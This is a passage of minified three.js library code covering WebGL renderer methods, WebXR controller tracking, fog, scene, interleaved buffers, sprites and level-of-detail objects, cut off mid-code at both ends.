ve},this.getContextAttributes=function(){return ve.getContextAttributes()},this.forceContextLoss=function(){var e=G.get("WEBGL_lose_context");e&&e.loseContext()},this.forceContextRestore=function(){var e=G.get("WEBGL_lose_context");e&&e.restoreContext()},this.getPixelRatio=function(){return I},this.setPixelRatio=function(e){void 0!==e&&(I=e,this.setSize(T,P,!1))},this.getSize=function(e){return void 0===e&&(e=new ie),e.set(T,P)},this.setSize=function(e,n,r){we.isPresenting||(T=e,P=n,t.width=Math.floor(e*I),t.height=Math.floor(n*I),!1!==r&&(t.style.width=e+"px",t.style.height=n+"px"),this.setViewport(0,0,e,n))},this.getDrawingBufferSize=function(e){return void 0===e&&(e=new ie),e.set(T*I,P*I).floor()},this.setDrawingBufferSize=function(e,n,r){T=e,P=n,I=r,t.width=Math.floor(e*r),t.height=Math.floor(n*r),this.setViewport(0,0,e,n)},this.getCurrentViewport=function(e){return void 0===e&&(e=new ce),e.copy(M)},this.getViewport=function(e){return e.copy(O)},this.setViewport=function(e,t,n,r){e.isVector4?O.set(e.x,e.y,e.z,e.w):O.set(e,t,n,r),K.viewport(M.copy(O).multiplyScalar(I).floor())},this.getScissor=function(e){return e.copy(N)},this.setScissor=function(e,t,n,r){e.isVector4?N.set(e.x,e.y,e.z,e.w):N.set(e,t,n,r),K.scissor(B.copy(N).multiplyScalar(I).floor())},this.getScissorTest=function(){return R},this.setScissorTest=function(e){K.setScissorTest(R=e)},this.setOpaqueSort=function(e){F=e},this.setTransparentSort=function(e){L=e},this.getClearColor=function(){return ue.getClearColor()},this.setClearColor=function(){ue.setClearColor.apply(ue,arguments)},this.getClearAlpha=function(){return ue.getClearAlpha()},this.setClearAlpha=function(){ue.setClearAlpha.apply(ue,arguments)},this.clear=function(e,t,n){var r=0;(void 0===e||e)&&(r|=16384),(void 0===t||t)&&(r|=256),(void 0===n||n)&&(r|=1024),ve.clear(r)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){t.removeEventListener("webglcontextlost",xe,!1),t.removeEventListener("webglcontextrestored",Se,!1),oe.dispose(),se.dispose(),X.dispose(),Z.dispose(),ne.dispose(),me.dispose(),we.dispose(),Ee.stop()},this.renderBufferImmediate=function(e,t){me.initAttributes();var n=X.get(e);e.hasPositions&&!n.position&&(n.position=ve.createBuffer()),e.hasNormals&&!n.normal&&(n.normal=ve.createBuffer()),e.hasUvs&&!n.uv&&(n.uv=ve.createBuffer()),e.hasColors&&!n.color&&(n.color=ve.createBuffer());var r=t.getAttributes();e.hasPositions&&(ve.bindBuffer(34962,n.position),ve.bufferData(34962,e.positionArray,35048),me.enableAttribute(r.position),ve.vertexAttribPointer(r.position,3,5126,!1,0,0)),e.hasNormals&&(ve.bindBuffer(34962,n.normal),ve.bufferData(34962,e.normalArray,35048),me.enableAttribute(r.normal),ve.vertexAttribPointer(r.normal,3,5126,!1,0,0)),e.hasUvs&&(ve.bindBuffer(34962,n.uv),ve.bufferData(34962,e.uvArray,35048),me.enableAttribute(r.uv),ve.vertexAttribPointer(r.uv,2,5126,!1,0,0)),e.hasColors&&(ve.bindBuffer(34962,n.color),ve.bufferData(34962,e.colorArray,35048),me.enableAttribute(r.color),ve.vertexAttribPointer(r.color,3,5126,!1,0,0)),me.disableUnusedAttributes(),ve.drawArrays(4,0,e.count),e.count=0},this.renderBufferDirect=function(e,t,n,r,i,a){null===t&&(t=V);var o=i.isMesh&&i.matrixWorld.determinant()<0,s=Fe(e,t,r,i);K.setMaterial(r,o);var l=n.index,c=n.attributes.position;if(null===l){if(void 0===c||0===c.count)return}else if(0===l.count)return;var u,d=1;!0===r.wireframe&&(l=te.getWireframeAttribute(n),d=2),(r.morphTargets||r.morphNormals)&&de.update(i,n,r,s),me.setup(i,r,s,n,l);var p=pe;null!==l&&(u=ee.get(l),(p=fe).setIndex(u));var h=null!==l?l.count:c.count,f=n.drawRange.start*d,A=n.drawRange.count*d,m=null!==a?a.start*d:0,v=null!==a?a.count*d:1/0,g=Math.max(f,m),y=Math.min(h,f+A,m+v)-1,b=Math.max(0,y-g+1);if(0!==b){if(i.isMesh)!0===r.wireframe?(K.setLineWidth(r.wireframeLinewidth*Q()),p.setMode(1)):p.setMode(4);else if(i.isLine){var _=r.linewidth;void 0===_&&(_=1),K.setLineWidth(_*Q()),i.isLineSegments?p.setMode(1):i.isLineLoop?p.setMode(2):p.setMode(3)}else i.isPoints?p.setMode(0):i.isSprite&&p.setMode(4);if(i.isInstancedMesh)p.renderInstances(g,b,i.count);else if(n.isInstancedBufferGeometry){var w=Math.min(n.instanceCount,n._maxInstanceCount);p.renderInstances(g,b,w)}else p.render(g,b)}},this.compile=function(e,t){(p=se.get(e,t)).init(),e.traverseVisible((function(e){e.isLight&&e.layers.test(t.layers)&&(p.pushLight(e),e.castShadow&&p.pushShadow(e))})),p.setupLights(t);var n=new WeakMap;e.traverse((function(t){var r=t.material;if(r)if(Array.isArray(r))for(var i=0;i<r.length;i++){var a=r[i];!1===n.has(a)&&(Ie(a,e,t),n.set(a))}else!1===n.has(r)&&(Ie(r,e,t),n.set(r))}))};var Be=null,Ee=new zn;function Te(e,t,n){for(var r=!0===t.isScene?t.overrideMaterial:null,i=0,a=e.length;i<a;i++){var o=e[i],s=o.object,l=o.geometry,c=null===r?o.material:r,u=o.group;if(n.isArrayCamera)for(var d=(k=n).cameras,h=0,f=d.length;h<f;h++){var A=d[h];s.layers.test(A.layers)&&(K.viewport(M.copy(A.viewport)),p.setupLights(A),Pe(s,t,A,l,c,u))}else k=null,Pe(s,t,n,l,c,u)}}function Pe(e,t,n,r,i,a){if(e.onBeforeRender(h,t,n,r,i,a),p=se.get(t,k||n),e.modelViewMatrix.multiplyMatrices(n.matrixWorldInverse,e.matrixWorld),e.normalMatrix.getNormalMatrix(e.modelViewMatrix),e.isImmediateRenderObject){var o=Fe(n,t,i,e);K.setMaterial(i),me.reset(),s=o,e.render((function(e){h.renderBufferImmediate(e,s)}))}else h.renderBufferDirect(n,t,r,i,e,a);var s;e.onAfterRender(h,t,n,r,i,a),p=se.get(t,k||n)}function Ie(e,t,n){!0!==t.isScene&&(t=V);var r=X.get(e),i=p.state.lights,a=p.state.shadowsArray,o=i.state.version,s=re.getParameters(e,i.state,a,t,n),l=re.getProgramCacheKey(s),c=r.program,u=!0;if(void 0===c)e.addEventListener("dispose",ke);else if(c.cacheKey!==l)Me(e);else if(r.lightsStateVersion!==o)u=!1;else{if(void 0!==s.shaderID){var d=e.isMeshStandardMaterial?t.environment:null;return void(r.envMap=Z.get(e.envMap||d))}u=!1}u&&(s.uniforms=re.getUniforms(e),e.onBeforeCompile(s,h),c=re.acquireProgram(s,l),r.program=c,r.uniforms=s.uniforms,r.outputEncoding=s.outputEncoding);var f,A=r.uniforms;(e.isShaderMaterial||e.isRawShaderMaterial)&&!0!==e.clipping||(r.numClippingPlanes=le.numPlanes,r.numIntersection=le.numIntersection,A.clippingPlanes=le.uniform),r.environment=e.isMeshStandardMaterial?t.environment:null,r.fog=t.fog,r.envMap=Z.get(e.envMap||r.environment),r.needsLights=(f=e).isMeshLambertMaterial||f.isMeshToonMaterial||f.isMeshPhongMaterial||f.isMeshStandardMaterial||f.isShadowMaterial||f.isShaderMaterial&&!0===f.lights,r.lightsStateVersion=o,r.needsLights&&(A.ambientLightColor.value=i.state.ambient,A.lightProbe.value=i.state.probe,A.directionalLights.value=i.state.directional,A.directionalLightShadows.value=i.state.directionalShadow,A.spotLights.value=i.state.spot,A.spotLightShadows.value=i.state.spotShadow,A.rectAreaLights.value=i.state.rectArea,A.ltc_1.value=i.state.rectAreaLTC1,A.ltc_2.value=i.state.rectAreaLTC2,A.pointLights.value=i.state.point,A.pointLightShadows.value=i.state.pointShadow,A.hemisphereLights.value=i.state.hemi,A.directionalShadowMap.value=i.state.directionalShadowMap,A.directionalShadowMatrix.value=i.state.directionalShadowMatrix,A.spotShadowMap.value=i.state.spotShadowMap,A.spotShadowMatrix.value=i.state.spotShadowMatrix,A.pointShadowMap.value=i.state.pointShadowMap,A.pointShadowMatrix.value=i.state.pointShadowMatrix);var m=r.program.getUniforms(),v=ii.seqWithValue(m.seq,A);r.uniformsList=v}function Fe(e,t,n,r){!0!==t.isScene&&(t=V),Y.resetTextureUnits();var i=t.fog,a=n.isMeshStandardMaterial?t.environment:null,o=null===y?h.outputEncoding:y.texture.encoding,s=Z.get(n.envMap||a),l=X.get(n),c=p.state.lights;if(!0===U&&(!0===$||e!==S)){var u=e===S&&n.id===C;le.setState(n,e,u)}n.version===l.__version?n.fog&&l.fog!==i||l.environment!==a||l.needsLights&&l.lightsStateVersion!==c.state.version?Ie(n,t,r):void 0===l.numClippingPlanes||l.numClippingPlanes===le.numPlanes&&l.numIntersection===le.numIntersection?(l.outputEncoding!==o||l.envMap!==s)&&Ie(n,t,r):Ie(n,t,r):(Ie(n,t,r),l.__version=n.version);var d,f,A=!1,m=!1,v=!1,g=l.program,_=g.getUniforms(),w=l.uniforms;if(K.useProgram(g.program)&&(v=m=A=!0),n.id!==C&&(C=n.id,m=!0),A||S!==e){if(_.setValue(ve,"projectionMatrix",e.projectionMatrix),W.logarithmicDepthBuffer&&_.setValue(ve,"logDepthBufFC",2/(Math.log(e.far+1)/Math.LN2)),S!==e&&(S=e,v=m=!0),n.isShaderMaterial||n.isMeshPhongMaterial||n.isMeshToonMaterial||n.isMeshStandardMaterial||n.envMap){var k=_.map.cameraPosition;void 0!==k&&k.setValue(ve,H.setFromMatrixPosition(e.matrixWorld))}(n.isMeshPhongMaterial||n.isMeshToonMaterial||n.isMeshLambertMaterial||n.isMeshBasicMaterial||n.isMeshStandardMaterial||n.isShaderMaterial)&&_.setValue(ve,"isOrthographic",!0===e.isOrthographicCamera),(n.isMeshPhongMaterial||n.isMeshToonMaterial||n.isMeshLambertMaterial||n.isMeshBasicMaterial||n.isMeshStandardMaterial||n.isShaderMaterial||n.isShadowMaterial||n.skinning)&&_.setValue(ve,"viewMatrix",e.matrixWorldInverse)}if(n.skinning){_.setOptional(ve,r,"bindMatrix"),_.setOptional(ve,r,"bindMatrixInverse");var M=r.skeleton;if(M){var B=M.bones;if(W.floatVertexTextures){if(void 0===M.boneTexture){var E=Math.sqrt(4*B.length);E=J.ceilPowerOfTwo(E),E=Math.max(E,4);var T=new Float32Array(E*E*4);T.set(M.boneMatrices);var F=new Rn(T,E,E,x,b);M.boneMatrices=T,M.boneTexture=F,M.boneTextureSize=E}_.setValue(ve,"boneTexture",M.boneTexture,Y),_.setValue(ve,"boneTextureSize",M.boneTextureSize)}else _.setOptional(ve,M,"boneMatrices")}}return(m||l.receiveShadow!==r.receiveShadow)&&(l.receiveShadow=r.receiveShadow,_.setValue(ve,"receiveShadow",r.receiveShadow)),m&&(_.setValue(ve,"toneMappingExposure",h.toneMappingExposure),l.needsLights&&(f=v,(d=w).ambientLightColor.needsUpdate=f,d.lightProbe.needsUpdate=f,d.directionalLights.needsUpdate=f,d.directionalLightShadows.needsUpdate=f,d.pointLights.needsUpdate=f,d.pointLightShadows.needsUpdate=f,d.spotLights.needsUpdate=f,d.spotLightShadows.needsUpdate=f,d.rectAreaLights.needsUpdate=f,d.hemisphereLights.needsUpdate=f),i&&n.fog&&ae.refreshFogUniforms(w,i),ae.refreshMaterialUniforms(w,n,I,P),ii.upload(ve,l.uniformsList,w,Y)),n.isShaderMaterial&&!0===n.uniformsNeedUpdate&&(ii.upload(ve,l.uniformsList,w,Y),n.uniformsNeedUpdate=!1),n.isSpriteMaterial&&_.setValue(ve,"center",r.center),_.setValue(ve,"modelViewMatrix",r.modelViewMatrix),_.setValue(ve,"normalMatrix",r.normalMatrix),_.setValue(ve,"modelMatrix",r.matrixWorld),g}Ee.setAnimationLoop((function(e){we.isPresenting||Be&&Be(e)})),"undefined"!=typeof window&&Ee.setContext(window),this.setAnimationLoop=function(e){Be=e,we.setAnimationLoop(e),null===e?Ee.stop():Ee.start()},this.render=function(e,t){var n,r;if(void 0!==arguments[2]&&(n=arguments[2]),void 0!==arguments[3]&&(r=arguments[3]),(void 0===t||!0===t.isCamera)&&!0!==f){me.resetDefaultState(),C=-1,!(S=null)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),!0===we.enabled&&!0===we.isPresenting&&(t=we.getCamera(t)),!0===e.isScene&&e.onBeforeRender(h,e,t,n||y),(p=se.get(e,t)).init(),z.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),j.setFromProjectionMatrix(z),$=this.localClippingEnabled,U=le.init(this.clippingPlanes,$,t),(d=oe.get(e,t)).init(),function e(t,n,r,i){if(!1!==t.visible){if(t.layers.test(n.layers))if(t.isGroup)r=t.renderOrder;else if(t.isLOD)!0===t.autoUpdate&&t.update(n);else if(t.isLight)p.pushLight(t),t.castShadow&&p.pushShadow(t);else if(t.isSprite){if(!t.frustumCulled||j.intersectsSprite(t)){i&&H.setFromMatrixPosition(t.matrixWorld).applyMatrix4(z);var a=ne.update(t),o=t.material;o.visible&&d.push(t,a,o,r,H.z,null)}}else if(t.isImmediateRenderObject)i&&H.setFromMatrixPosition(t.matrixWorld).applyMatrix4(z),d.push(t,null,t.material,r,H.z,null);else if((t.isMesh||t.isLine||t.isPoints)&&(t.isSkinnedMesh&&t.skeleton.frame!==q.render.frame&&(t.skeleton.update(),t.skeleton.frame=q.render.frame),!t.frustumCulled||j.intersectsObject(t))){i&&H.setFromMatrixPosition(t.matrixWorld).applyMatrix4(z);var s=ne.update(t),l=t.material;if(Array.isArray(l))for(var c=s.groups,u=0,h=c.length;u<h;u++){var f=c[u],A=l[f.materialIndex];A&&A.visible&&d.push(t,s,A,r,H.z,f)}else l.visible&&d.push(t,s,l,r,H.z,null)}for(var m=t.children,v=0,g=m.length;v<g;v++)e(m[v],n,r,i)}}(e,t,0,h.sortObjects),d.finish(),!0===h.sortObjects&&d.sort(F,L),!0===U&&le.beginShadows();var i=p.state.shadowsArray;Ce.render(i,e,t),p.setupLights(t),!0===U&&le.endShadows(),!0===this.info.autoReset&&this.info.reset(),void 0!==n&&this.setRenderTarget(n),ue.render(d,e,t,r);var a=d.opaque,o=d.transparent;0<a.length&&Te(a,e,t),0<o.length&&Te(o,e,t),!0===e.isScene&&e.onAfterRender(h,e,t),null!==y&&(Y.updateRenderTargetMipmap(y),Y.updateMultisampleRenderTarget(y)),K.buffers.depth.setTest(!0),K.buffers.depth.setMask(!0),K.buffers.color.setMask(!0),K.setPolygonOffset(!1),p=d=null}},this.setFramebuffer=function(e){A!==e&&null===y&&ve.bindFramebuffer(36160,e),A=e},this.getActiveCubeFace=function(){return m},this.getActiveMipmapLevel=function(){return g},this.getRenderList=function(){return d},this.setRenderList=function(e){d=e},this.getRenderState=function(){return p},this.setRenderState=function(e){p=e},this.getRenderTarget=function(){return y},this.setRenderTarget=function(e,t,n){void 0===t&&(t=0),void 0===n&&(n=0),m=t,g=n,(y=e)&&void 0===X.get(e).__webglFramebuffer&&Y.setupRenderTarget(e);var r=A,i=!1;if(e){var a=X.get(e).__webglFramebuffer;e.isWebGLCubeRenderTarget?(r=a[t],i=!0):r=e.isWebGLMultisampleRenderTarget?X.get(e).__webglMultisampledFramebuffer:a,M.copy(e.viewport),B.copy(e.scissor),E=e.scissorTest}else M.copy(O).multiplyScalar(I).floor(),B.copy(N).multiplyScalar(I).floor(),E=R;if(w!==r&&(ve.bindFramebuffer(36160,r),w=r),K.viewport(M),K.scissor(B),K.setScissorTest(E),i){var o=X.get(e.texture);ve.framebufferTexture2D(36160,36064,34069+t,o.__webglTexture,n)}},this.readRenderTargetPixels=function(e,t,n,r,i,a,o){if(e&&e.isWebGLRenderTarget){var s=X.get(e).__webglFramebuffer;if(e.isWebGLCubeRenderTarget&&void 0!==o&&(s=s[o]),s){var l=!1;s!==w&&(ve.bindFramebuffer(36160,s),l=!0);try{var c=e.texture,u=c.format,d=c.type;if(u!==x&&Ae.convert(u)!==ve.getParameter(35739))return;if(!(d===v||Ae.convert(d)===ve.getParameter(35738)||d===b&&(W.isWebGL2||G.get("OES_texture_float")||G.get("WEBGL_color_buffer_float"))||d===_&&(W.isWebGL2?G.get("EXT_color_buffer_float"):G.get("EXT_color_buffer_half_float"))))return;36053===ve.checkFramebufferStatus(36160)&&0<=t&&t<=e.width-r&&0<=n&&n<=e.height-i&&ve.readPixels(t,n,r,i,Ae.convert(u),Ae.convert(d),a)}finally{l&&ve.bindFramebuffer(36160,w)}}}},this.copyFramebufferToTexture=function(e,t,n){void 0===n&&(n=0);var r=Math.pow(2,-n),i=Math.floor(t.image.width*r),a=Math.floor(t.image.height*r),o=Ae.convert(t.format);Y.setTexture2D(t,0),ve.copyTexImage2D(3553,n,o,e.x,e.y,i,a,0),K.unbindTexture()},this.copyTextureToTexture=function(e,t,n,r){void 0===r&&(r=0);var i=t.image.width,a=t.image.height,o=Ae.convert(n.format),s=Ae.convert(n.type);Y.setTexture2D(n,0),ve.pixelStorei(37440,n.flipY),ve.pixelStorei(37441,n.premultiplyAlpha),ve.pixelStorei(3317,n.unpackAlignment),t.isDataTexture?ve.texSubImage2D(3553,r,e.x,e.y,i,a,o,s,t.image.data):t.isCompressedTexture?ve.compressedTexSubImage2D(3553,r,e.x,e.y,t.mipmaps[0].width,t.mipmaps[0].height,o,t.mipmaps[0].data):ve.texSubImage2D(3553,r,e.x,e.y,o,s,t.image),0===r&&n.generateMipmaps&&ve.generateMipmap(3553),K.unbindTexture()},this.initTexture=function(e){Y.setTexture2D(e,0),K.unbindTexture()},"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}function Wi(e){Gi.call(this,e)}$i.prototype=Object.assign(Object.create(Ln.prototype),{constructor:$i,isArrayCamera:!0}),zi.prototype=Object.assign(Object.create(pt.prototype),{constructor:zi,isGroup:!0}),Object.assign(Hi.prototype,{constructor:Hi,getHandSpace:function(){if(null===this._hand&&(this._hand=new zi,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints=[],this._hand.inputState={pinching:!1},window.XRHand))for(var e=0;e<=window.XRHand.LITTLE_PHALANX_TIP;e++){var t=new zi;t.matrixAutoUpdate=!1,t.visible=!1,this._hand.joints.push(t),this._hand.add(t)}return this._hand},getTargetRaySpace:function(){return null===this._targetRay&&(this._targetRay=new zi,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1),this._targetRay},getGripSpace:function(){return null===this._grip&&(this._grip=new zi,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1),this._grip},dispatchEvent:function(e){return null!==this._targetRay&&this._targetRay.dispatchEvent(e),null!==this._grip&&this._grip.dispatchEvent(e),null!==this._hand&&this._hand.dispatchEvent(e),this},disconnect:function(e){return this.dispatchEvent({type:"disconnected",data:e}),null!==this._targetRay&&(this._targetRay.visible=!1),null!==this._grip&&(this._grip.visible=!1),null!==this._hand&&(this._hand.visible=!1),this},update:function(e,t,n){var r=null,i=null,a=null,o=this._targetRay,s=this._grip,l=this._hand;if(e)if(l&&e.hand){a=!0;for(var c=0;c<=window.XRHand.LITTLE_PHALANX_TIP;c++)if(e.hand[c]){var u=t.getJointPose(e.hand[c],n),d=l.joints[c];null!==u&&(d.matrix.fromArray(u.transform.matrix),d.matrix.decompose(d.position,d.rotation,d.scale),d.jointRadius=u.radius),d.visible=null!==u;var p=l.joints[window.XRHand.INDEX_PHALANX_TIP],h=l.joints[window.XRHand.THUMB_PHALANX_TIP],f=p.position.distanceTo(h.position);l.inputState.pinching&&.025<f?(l.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!l.inputState.pinching&&f<=.015&&(l.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}}else null!==o&&null!==(r=t.getPose(e.targetRaySpace,n))&&(o.matrix.fromArray(r.transform.matrix),o.matrix.decompose(o.position,o.rotation,o.scale)),null!==s&&e.gripSpace&&null!==(i=t.getPose(e.gripSpace,n))&&(s.matrix.fromArray(i.transform.matrix),s.matrix.decompose(s.position,s.rotation,s.scale));return null!==o&&(o.visible=null!==r),null!==s&&(s.visible=null!==i),null!==l&&(l.visible=null!==a),this}}),Object.assign(Vi.prototype,K.prototype),Wi.prototype=Object.assign(Object.create(Gi.prototype),{constructor:Wi,isWebGL1Renderer:!0});var Ki=function(){function e(e,t){Object.defineProperty(this,"isFogExp2",{value:!0}),this.name="",this.color=new Lt(e),this.density=void 0!==t?t:25e-5}var t=e.prototype;return t.clone=function(){return new e(this.color,this.density)},t.toJSON=function(){return{type:"FogExp2",color:this.color.getHex(),density:this.density}},e}(),qi=function(){function e(e,t,n){Object.defineProperty(this,"isFog",{value:!0}),this.name="",this.color=new Lt(e),this.near=void 0!==t?t:1,this.far=void 0!==n?n:1e3}var t=e.prototype;return t.clone=function(){return new e(this.color,this.near,this.far)},t.toJSON=function(){return{type:"Fog",color:this.color.getHex(),near:this.near,far:this.far}},e}(),Xi=function(e){function t(){var t;return t=e.call(this)||this,Object.defineProperty(ne(t),"isScene",{value:!0}),t.type="Scene",t.background=null,t.environment=null,t.fog=null,t.overrideMaterial=null,t.autoUpdate=!0,"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:ne(t)})),t}te(t,e);var n=t.prototype;return n.copy=function(t,n){return e.prototype.copy.call(this,t,n),null!==t.background&&(this.background=t.background.clone()),null!==t.environment&&(this.environment=t.environment.clone()),null!==t.fog&&(this.fog=t.fog.clone()),null!==t.overrideMaterial&&(this.overrideMaterial=t.overrideMaterial.clone()),this.autoUpdate=t.autoUpdate,this.matrixAutoUpdate=t.matrixAutoUpdate,this},n.toJSON=function(t){var n=e.prototype.toJSON.call(this,t);return null!==this.background&&(n.object.background=this.background.toJSON(t)),null!==this.environment&&(n.object.environment=this.environment.toJSON(t)),null!==this.fog&&(n.object.fog=this.fog.toJSON()),n},t}(pt);function Yi(e,t){this.array=e,this.stride=t,this.count=void 0!==e?e.length/t:0,this.usage=Q,this.updateRange={offset:0,count:-1},this.version=0,this.uuid=J.generateUUID()}Object.defineProperty(Yi.prototype,"needsUpdate",{set:function(e){!0===e&&this.version++}}),Object.assign(Yi.prototype,{isInterleavedBuffer:!0,onUploadCallback:function(){},setUsage:function(e){return this.usage=e,this},copy:function(e){return this.array=new e.array.constructor(e.array),this.count=e.count,this.stride=e.stride,this.usage=e.usage,this},copyAt:function(e,t,n){e*=this.stride,n*=t.stride;for(var r=0,i=this.stride;r<i;r++)this.array[e+r]=t.array[n+r];return this},set:function(e,t){return void 0===t&&(t=0),this.array.set(e,t),this},clone:function(e){void 0===e.arrayBuffers&&(e.arrayBuffers={}),void 0===this.array.buffer._uuid&&(this.array.buffer._uuid=J.generateUUID()),void 0===e.arrayBuffers[this.array.buffer._uuid]&&(e.arrayBuffers[this.array.buffer._uuid]=this.array.slice(0).buffer);var t=new Yi(new this.array.constructor(e.arrayBuffers[this.array.buffer._uuid]),this.stride);return t.setUsage(this.usage),t},onUpload:function(e){return this.onUploadCallback=e,this},toJSON:function(e){return void 0===e.arrayBuffers&&(e.arrayBuffers={}),void 0===this.array.buffer._uuid&&(this.array.buffer._uuid=J.generateUUID()),void 0===e.arrayBuffers[this.array.buffer._uuid]&&(e.arrayBuffers[this.array.buffer._uuid]=Array.prototype.slice.call(new Uint32Array(this.array.buffer))),{uuid:this.uuid,buffer:this.array.buffer._uuid,type:this.array.constructor.name,stride:this.stride}}});var Ji,Zi=new he;function ea(e,t,n,r){this.name="",this.data=e,this.itemSize=t,this.offset=n,this.normalized=!0===r}function ta(e){Dt.call(this),this.type="SpriteMaterial",this.color=new Lt(16777215),this.map=null,this.alphaMap=null,this.rotation=0,this.sizeAttenuation=!0,this.transparent=!0,this.setValues(e)}Object.defineProperties(ea.prototype,{count:{get:function(){return this.data.count}},array:{get:function(){return this.data.array}},needsUpdate:{set:function(e){this.data.needsUpdate=e}}}),Object.assign(ea.prototype,{isInterleavedBufferAttribute:!0,applyMatrix4:function(e){for(var t=0,n=this.data.count;t<n;t++)Zi.x=this.getX(t),Zi.y=this.getY(t),Zi.z=this.getZ(t),Zi.applyMatrix4(e),this.setXYZ(t,Zi.x,Zi.y,Zi.z);return this},setX:function(e,t){return this.data.array[e*this.data.stride+this.offset]=t,this},setY:function(e,t){return this.data.array[e*this.data.stride+this.offset+1]=t,this},setZ:function(e,t){return this.data.array[e*this.data.stride+this.offset+2]=t,this},setW:function(e,t){return this.data.array[e*this.data.stride+this.offset+3]=t,this},getX:function(e){return this.data.array[e*this.data.stride+this.offset]},getY:function(e){return this.data.array[e*this.data.stride+this.offset+1]},getZ:function(e){return this.data.array[e*this.data.stride+this.offset+2]},getW:function(e){return this.data.array[e*this.data.stride+this.offset+3]},setXY:function(e,t,n){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=n,this},setXYZ:function(e,t,n,r){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=n,this.data.array[e+2]=r,this},setXYZW:function(e,t,n,r,i){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=n,this.data.array[e+2]=r,this.data.array[e+3]=i,this},clone:function(e){if(void 0!==e)return void 0===e.interleavedBuffers&&(e.interleavedBuffers={}),void 0===e.interleavedBuffers[this.data.uuid]&&(e.interleavedBuffers[this.data.uuid]=this.data.clone(e)),new ea(e.interleavedBuffers[this.data.uuid],this.itemSize,this.offset,this.normalized);for(var t=[],n=0;n<this.count;n++)for(var r=n*this.data.stride+this.offset,i=0;i<this.itemSize;i++)t.push(this.data.array[r+i]);return new $t(new this.array.constructor(t),this.itemSize,this.normalized)},toJSON:function(e){if(void 0!==e)return void 0===e.interleavedBuffers&&(e.interleavedBuffers={}),void 0===e.interleavedBuffers[this.data.uuid]&&(e.interleavedBuffers[this.data.uuid]=this.data.toJSON(e)),{isInterleavedBufferAttribute:!0,itemSize:this.itemSize,data:this.data.uuid,offset:this.offset,normalized:this.normalized};for(var t=[],n=0;n<this.count;n++)for(var r=n*this.data.stride+this.offset,i=0;i<this.itemSize;i++)t.push(this.data.array[r+i]);return{itemSize:this.itemSize,type:this.array.constructor.name,array:t,normalized:this.normalized}}}),((ta.prototype=Object.create(Dt.prototype)).constructor=ta).prototype.isSpriteMaterial=!0,ta.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.rotation=e.rotation,this.sizeAttenuation=e.sizeAttenuation,this};var na=new he,ra=new he,ia=new he,aa=new ie,oa=new ie,sa=new $e,la=new he,ca=new he,ua=new he,da=new ie,pa=new ie,ha=new ie;function fa(e){if(pt.call(this),this.type="Sprite",void 0===Ji){Ji=new sn;var t=new Yi(new Float32Array([-.5,-.5,0,0,0,.5,-.5,0,1,0,.5,.5,0,1,1,-.5,.5,0,0,1]),5);Ji.setIndex([0,1,2,0,2,3]),Ji.setAttribute("position",new ea(t,3,0,!1)),Ji.setAttribute("uv",new ea(t,2,3,!1))}this.geometry=Ji,this.material=void 0!==e?e:new ta,this.center=new ie(.5,.5)}function Aa(e,t,n,r,i,a){aa.subVectors(e,n).addScalar(.5).multiply(r),void 0!==i?(oa.x=a*aa.x-i*aa.y,oa.y=i*aa.x+a*aa.y):oa.copy(aa),e.copy(t),e.x+=oa.x,e.y+=oa.y,e.applyMatrix4(sa)}fa.prototype=Object.assign(Object.create(pt.prototype),{constructor:fa,isSprite:!0,raycast:function(e,t){e.camera,ra.setFromMatrixScale(this.matrixWorld),sa.copy(e.camera.matrixWorld),this.modelViewMatrix.multiplyMatrices(e.camera.matrixWorldInverse,this.matrixWorld),ia.setFromMatrixPosition(this.modelViewMatrix),e.camera.isPerspectiveCamera&&!1===this.material.sizeAttenuation&&ra.multiplyScalar(-ia.z);var n,r,i=this.material.rotation;0!==i&&(r=Math.cos(i),n=Math.sin(i));var a=this.center;Aa(la.set(-.5,-.5,0),ia,a,ra,n,r),Aa(ca.set(.5,-.5,0),ia,a,ra,n,r),Aa(ua.set(.5,.5,0),ia,a,ra,n,r),da.set(0,0),pa.set(1,0),ha.set(1,1);var o=e.ray.intersectTriangle(la,ca,ua,!1,na);if(null!==o||(Aa(ca.set(-.5,.5,0),ia,a,ra,n,r),pa.set(0,1),null!==(o=e.ray.intersectTriangle(la,ua,ca,!1,na)))){var s=e.ray.origin.distanceTo(na);s<e.near||s>e.far||t.push({distance:s,point:na.clone(),uv:Mt.getUV(na,la,ca,ua,da,pa,ha,new ie),face:null,object:this})}},copy:function(e){return pt.prototype.copy.call(this,e),void 0!==e.center&&this.center.copy(e.center),this.material=e.material,this}});var ma,va,ga,ya,ba,_a=new he,wa=new he;function Ca(){pt.call(this),this._currentLevel=0,this.type="LOD",Object.defineProperties(this,{levels:{enumerable:!0,value:[]}}),this.autoUpdate=!0}function xa(e,t){e&&e.isGeometry,Sn.call(this,e,t),this.type="SkinnedMesh",this.bindMode="attached",this.bindMatrix=new $e,this.bindMatrixInverse=new $e}Ca.prototype=Object.assign(Object.create(pt.prototype),{constructor:Ca,isLOD:!0,copy:function(e){pt.prototype.copy.call(this,e,!1);for(var t=e.levels,n=0,r=t.length;n<r;n++){var i=t[n];this.addLevel(i.object.clone(),i.distance)}return this.autoUpdate=e.autoUpdate,this},addLevel:function(e,t){void 0===t&&(t=0),t=Math.abs(t);var n,r=this.levels;for(n=0;n<r.length&&!(t<r[n].distance);n++);return r.splice(n,0,{distance:t,object:e}),this.add(e),this},getCurrentLevel:function(){return this._currentLevel},getObjectForDistance:function(e){var 